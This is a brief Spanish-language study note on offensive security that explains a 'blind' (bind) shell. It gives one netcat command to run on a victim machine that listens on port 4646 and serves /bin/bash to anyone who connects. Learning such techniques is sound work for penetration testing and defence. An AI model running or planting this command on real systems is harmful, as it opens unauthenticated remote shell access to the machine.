#vulnerabilidad #explotacion #shell 

-------
Una **Blind Shell** no envía una consola interactiva a tu equipo. En cambio, habilita un puerto temporal con una **bash** activa, de modo que cuando te pones en escucha en ese puerto, ya tienes acceso a este tipo de shell.

Algunos comandos que se pueden ejecutar en la máquina víctima son:

`nc -nlvp 4646 -e /bin/bash`

Este comando escucha en el puerto 4646 y ejecuta la bash, proporcionando acceso a una Shell sin necesidad de una interacción directa o consola que envíe retroalimentación en tiempo real.